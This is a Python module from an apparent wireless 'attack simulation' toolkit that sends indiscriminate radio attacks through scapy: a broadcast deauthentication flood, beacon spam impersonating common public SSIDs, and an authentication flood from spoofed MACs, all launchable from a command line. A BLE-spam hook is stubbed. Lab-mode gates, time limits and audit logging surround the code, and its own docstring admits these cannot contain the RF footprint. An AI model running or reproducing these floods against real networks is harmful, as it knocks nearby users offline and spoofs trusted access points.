"""Tier B broadcast offense (attack simulation): deauth-flood, beacon spam,
assoc/auth flood, BLE-advert spam. INDISCRIMINATE by construction -- used to
validate lab defenses, NOT targeted. There is no target gate; instead every
burst requires Gate.broadcast_allowed() (lab_mode + allow_broadcast +
broadcast_armed), is TIME-BOXED to broadcast.max_burst_seconds with auto-stop,
pinned to broadcast.channel, and capped to broadcast.max_tx_power_dbm.
protect_bssids are excluded wherever the attack form allows. Transmitter,
channel-setter, BLE sender, and clock/sleep are injected for hardware-free,
deterministic tests.

NOTE: these software rails shrink but cannot CONTAIN an RF broadcast footprint;
only physical isolation keeps it off non-lab gear. Running Tier B is the lab
owner's responsibility (documented in lab_targets.json).
"""
from __future__ import annotations

import time
from dataclasses import dataclass

from offense.rf_targeted import BROADCAST  # reuse

from kuma_core import kuroshuna_stats


@dataclass
class BroadcastResult:
    ok: bool
    reason: str
    action: str
    bursts: int = 0
    seconds: float = 0.0
    dry_run: bool = False


DEFAULT_SPAM_SSIDS = ["FreeWiFi", "Starbucks", "xfinitywifi", "ATTWiFi",
                      "Guest", "Public", "NETGEAR", "linksys"]


def build_beacon_frame(ssid: str, bssid: str):
    from scapy.all import (Dot11, Dot11Beacon, Dot11Elt, RadioTap)  # type: ignore
    return (RadioTap()
            / Dot11(type=0, subtype=8, addr1=BROADCAST, addr2=bssid, addr3=bssid)
            / Dot11Beacon(cap="ESS")
            / Dot11Elt(ID=0, info=ssid.encode()))


def build_auth_frame(bssid: str, src: str):
    from scapy.all import Dot11, Dot11Auth, RadioTap  # type: ignore
    return (RadioTap()
            / Dot11(addr1=bssid, addr2=src, addr3=bssid)
            / Dot11Auth(algo=0, seqnum=1, status=0))


def _sendp(frames, iface, count):
    from scapy.all import sendp  # type: ignore
    sendp(frames, iface=iface, count=count, inter=0.05, verbose=False)


def _set_channel(iface, channel):
    import subprocess
    r = subprocess.run(["iw", "dev", iface, "set", "channel", str(channel)],
                       capture_output=True)
    if r.returncode != 0:
        raise RuntimeError(
            f"channel set failed (ch{channel} on {iface}): {r.stderr.decode(errors='ignore').strip()}")


def _ble_advert_send():
    # Real BLE advertising spam uses the Pi's BT controller via bluez HCI; kept as
    # a lazy injected dependency. Not exercised in CI (no controller on the dev box).
    raise NotImplementedError(
        "inject a ble_sender (bluez/HCI) on the Pi to enable BLE spam")


class BroadcastRF:
    def __init__(self, gate, iface: str | None = None, *, sender=None,
                 set_channel=None, ble_sender=None, clock=None, sleep=None,
                 dry_run: bool = False) -> None:
        from kuma_core.config import settings
        self.gate = gate
        self.iface = iface or settings.monitor_interface
        self._sender = sender
        self._set_channel = set_channel
        self._ble_sender = ble_sender
        self._clock = clock or time.monotonic
        self._sleep = sleep or time.sleep
        self.dry_run = dry_run

    # ------------------------------------------------------------------
    # Core helpers
    # ------------------------------------------------------------------

    def _cap_duration(self, requested) -> int:
        cap = self.gate.broadcast_limits()["max_burst_seconds"]
        if cap is None or not isinstance(cap, (int, float)) or cap <= 0:
            raise ValueError(f"invalid max_burst_seconds: {cap!r}")
        if requested is None:
            return int(cap)
        return min(int(requested), int(cap))

    def _run_burst(self, send_fn, duration, interval: float = 0.1) -> int:
        """Run send_fn in a time-boxed loop.

        Loop semantics (do-while):
          1. Send first.
          2. Check elapsed (via injected clock) after send + sleep.
          3. Stop when elapsed >= duration.

        With _Clock(step=1.0) and duration=3:
          start=0; after send[0] sleep: elapsed=1 < 3 continue;
          after send[1] sleep: elapsed=2 < 3 continue;
          after send[2] sleep: elapsed=3 >= 3 stop -> 3 bursts.
        With _Clock(step=3.0) and duration=3:
          start=0; after send[0] sleep: elapsed=3 >= 3 stop -> 1 burst.
        """
        start = self._clock()
        bursts = 0
        while True:
            send_fn()
            bursts += 1
            self._sleep(interval)
            if self._clock() - start >= duration:
                break
        return bursts

    def _protected_macs(self) -> set:
        return {b.upper() for b in self.gate.cfg.get("protect_bssids", [])}

    def _begin(self, action: str):
        """Gate check + return (ok, reason, pinned_channel). Returns (False, reason, None) on denial."""
        allowed, why = self.gate.broadcast_allowed()
        if not allowed:
            # FIX N2: Gate.broadcast_allowed() already audits on denial; do NOT double-audit here.
            return False, why, None
        return True, why, self.gate.broadcast_limits()["channel"]

    # ------------------------------------------------------------------
    # Attack methods
    # ------------------------------------------------------------------

    def deauth_flood(self, channel: int | None = None, duration=None,
                     bssids=None) -> BroadcastResult:
        from offense.rf_targeted import build_deauth_frames
        ok, why, pinned = self._begin("deauth_flood")
        if not ok:
            return BroadcastResult(False, why, "deauth_flood")
        # FIX I2: use 'is not None' so channel=0 is honoured
        ch = channel if channel is not None else pinned
        dur = self._cap_duration(duration)
        if self.dry_run:
            # FIX I1: audit dry-run before returning
            self.gate.audit({"tier": "B", "action": "deauth_flood", "target": "*",
                             "allowed": True, "reason": "dry-run (no tx)"})
            return BroadcastResult(True, "dry-run (no tx)", "deauth_flood",
                                   seconds=dur, dry_run=True)
        # honor protect_bssids: never deauth our own APs
        protected = self._protected_macs() if self.gate.broadcast_limits()[
            "honor_protect_bssids"] else set()
        targets = [b for b in (bssids or [BROADCAST]) if b.upper() not in protected]

        # FIX C2: channel pin is fail-closed
        try:
            (self._set_channel or _set_channel)(self.iface, ch)
        except Exception as e:
            self.gate.audit({"tier": "B", "action": "deauth_flood", "target": "*",
                             "allowed": False, "reason": f"channel pin failed: {e}"})
            return BroadcastResult(False, f"channel pin failed: {e}", "deauth_flood")

        def _send():
            for b in targets:
                frames = build_deauth_frames(b, BROADCAST)
                (self._sender or _sendp)(frames, self.iface, 1)

        bursts = self._run_burst(_send, dur)
        self.gate.audit({"tier": "B", "action": "deauth_flood", "target": "*",
                         "allowed": True,
                         "reason": f"{bursts} bursts/{dur}s ch{ch}"})
        if bursts > 0:
            try:
                kuroshuna_stats.record_tx(bursts * len(targets))  # frames actually sent
            except Exception:
                pass
        return BroadcastResult(True, why, "deauth_flood", bursts, dur)

    def beacon_spam(self, ssids=None, duration=None) -> BroadcastResult:
        ok, why, pinned = self._begin("beacon_spam")
        if not ok:
            return BroadcastResult(False, why, "beacon_spam")
        dur = self._cap_duration(duration)
        names = ssids or DEFAULT_SPAM_SSIDS
        if self.dry_run:
            # FIX I1: audit dry-run before returning
            self.gate.audit({"tier": "B", "action": "beacon_spam", "target": "*",
                             "allowed": True, "reason": "dry-run (no tx)"})
            return BroadcastResult(True, "dry-run (no tx)", "beacon_spam",
                                   seconds=dur, dry_run=True)

        # FIX C2: channel pin is fail-closed
        try:
            (self._set_channel or _set_channel)(self.iface, pinned)
        except Exception as e:
            self.gate.audit({"tier": "B", "action": "beacon_spam", "target": "*",
                             "allowed": False, "reason": f"channel pin failed: {e}"})
            return BroadcastResult(False, f"channel pin failed: {e}", "beacon_spam")

        # deterministic fake BSSIDs (index-based, locally-administered 02: prefix);
        # never collide with a protected BSSID.
        protected = self._protected_macs()
        frames = []
        for i, ssid in enumerate(names):
            bssid = "02:00:00:%02x:%02x:%02x" % (i & 0xff, (i >> 8) & 0xff, 0x10 + i)
            if bssid.upper() in protected:
                continue
            frames.append(build_beacon_frame(ssid, bssid))

        def _send():
            (self._sender or _sendp)(frames, self.iface, 1)

        bursts = self._run_burst(_send, dur)
        self.gate.audit({"tier": "B", "action": "beacon_spam", "target": "*",
                         "allowed": True,
                         "reason": f"{len(frames)} SSIDs x {bursts} bursts/{dur}s"})
        if bursts > 0:
            try:
                kuroshuna_stats.record_tx(bursts * len(frames))  # frames actually sent
            except Exception:
                pass
        return BroadcastResult(True, why, "beacon_spam", bursts, dur)

    def assoc_flood(self, bssid: str, duration=None, clients: int = 64) -> BroadcastResult:
        ok, why, pinned = self._begin("assoc_flood")
        if not ok:
            return BroadcastResult(False, why, "assoc_flood")
        if bssid.upper() in self._protected_macs():
            self.gate.audit({"tier": "B", "action": "assoc_flood", "target": bssid,
                             "allowed": False, "reason": "protected AP"})
            return BroadcastResult(False, "protected AP (refused)", "assoc_flood")
        dur = self._cap_duration(duration)
        if self.dry_run:
            # FIX I1: audit dry-run before returning
            self.gate.audit({"tier": "B", "action": "assoc_flood", "target": bssid,
                             "allowed": True, "reason": "dry-run (no tx)"})
            return BroadcastResult(True, "dry-run (no tx)", "assoc_flood",
                                   seconds=dur, dry_run=True)

        # FIX C2: channel pin is fail-closed
        try:
            (self._set_channel or _set_channel)(self.iface, pinned)
        except Exception as e:
            self.gate.audit({"tier": "B", "action": "assoc_flood", "target": bssid,
                             "allowed": False, "reason": f"channel pin failed: {e}"})
            return BroadcastResult(False, f"channel pin failed: {e}", "assoc_flood")

        # FIX N1: spoofed source MACs — all bytes derive distinctly from i
        frames = [build_auth_frame(bssid,
                                   "02:%02x:%02x:%02x:%02x:%02x" % (
                                       i >> 24 & 0xff, i >> 16 & 0xff,
                                       i >> 8 & 0xff, i & 0xff, 0))
                  for i in range(clients)]

        def _send():
            (self._sender or _sendp)(frames, self.iface, 1)

        bursts = self._run_burst(_send, dur)
        self.gate.audit({"tier": "B", "action": "assoc_flood", "target": bssid,
                         "allowed": True, "reason": f"{clients} fake STAs x {bursts}/{dur}s"})
        if bursts > 0:
            try:
                kuroshuna_stats.record_tx(bursts * len(frames))  # frames actually sent
            except Exception:
                pass
        return BroadcastResult(True, why, "assoc_flood", bursts, dur)

    def ble_spam(self, duration=None) -> BroadcastResult:
        ok, why, _pinned = self._begin("ble_spam")
        if not ok:
            return BroadcastResult(False, why, "ble_spam")
        dur = self._cap_duration(duration)
        if self.dry_run:
            # FIX I1: audit dry-run before returning
            self.gate.audit({"tier": "B", "action": "ble_spam", "target": "*",
                             "allowed": True, "reason": "dry-run (no tx)"})
            return BroadcastResult(True, "dry-run (no tx)", "ble_spam",
                                   seconds=dur, dry_run=True)
        send = self._ble_sender or _ble_advert_send
        # FIX I4: ble errors surface as ok=False, not uncaught crash
        try:
            bursts = self._run_burst(send, dur)
        except Exception as e:
            self.gate.audit({"tier": "B", "action": "ble_spam", "target": "*",
                             "allowed": False, "reason": f"ble error: {e}"})
            return BroadcastResult(False, f"ble error: {e}", "ble_spam")
        self.gate.audit({"tier": "B", "action": "ble_spam", "target": "*",
                         "allowed": True, "reason": f"{bursts} adverts/{dur}s"})
        if bursts > 0:
            try:
                kuroshuna_stats.record_tx(bursts)
            except Exception:
                pass
        return BroadcastResult(True, why, "ble_spam", bursts, dur)


# ------------------------------------------------------------------
# CLI
# ------------------------------------------------------------------

def build_args(argv):
    import argparse
    p = argparse.ArgumentParser(
        prog="offense.rf_broadcast",
        description="Kuroshuna Tier B broadcast (attack simulation). Requires "
                    "lab_mode + allow_broadcast + broadcast_armed; time-boxed.")
    p.add_argument("--deauth-flood", dest="deauth_flood", action="store_true")
    p.add_argument("--beacon-spam", dest="beacon_spam", action="store_true")
    p.add_argument("--assoc-flood", dest="assoc_flood", metavar="BSSID")
    p.add_argument("--ble-spam", dest="ble_spam", action="store_true")
    p.add_argument("--duration", type=int, default=None)
    p.add_argument("--iface", default=None)
    p.add_argument("--no-tx", dest="no_tx", action="store_true")
    return p.parse_args(argv)


def run_cli(args, rf=None) -> int:
    actions = [args.deauth_flood, args.beacon_spam, bool(args.assoc_flood),
               args.ble_spam]
    if not any(actions):
        print("error: specify --deauth-flood / --beacon-spam / --assoc-flood BSSID "
              "/ --ble-spam", flush=True)
        return 2
    if rf is None:
        from kuma_core.authz import Gate
        rf = BroadcastRF(gate=Gate(), iface=args.iface, dry_run=args.no_tx)
    rc = 0

    def _report(r):
        nonlocal rc
        print(f"[{r.action}] ok={r.ok} {r.reason} bursts={r.bursts} "
              f"secs={r.seconds}{' (dry-run)' if r.dry_run else ''}", flush=True)
        rc = rc or (0 if r.ok else 1)

    if args.deauth_flood:
        _report(rf.deauth_flood(duration=args.duration))
    if args.beacon_spam:
        _report(rf.beacon_spam(duration=args.duration))
    if args.assoc_flood:
        _report(rf.assoc_flood(args.assoc_flood, duration=args.duration))
    if args.ble_spam:
        _report(rf.ble_spam(duration=args.duration))
    return rc


if __name__ == "__main__":  # pragma: no cover
    import sys
    sys.exit(run_cli(build_args(sys.argv[1:])))
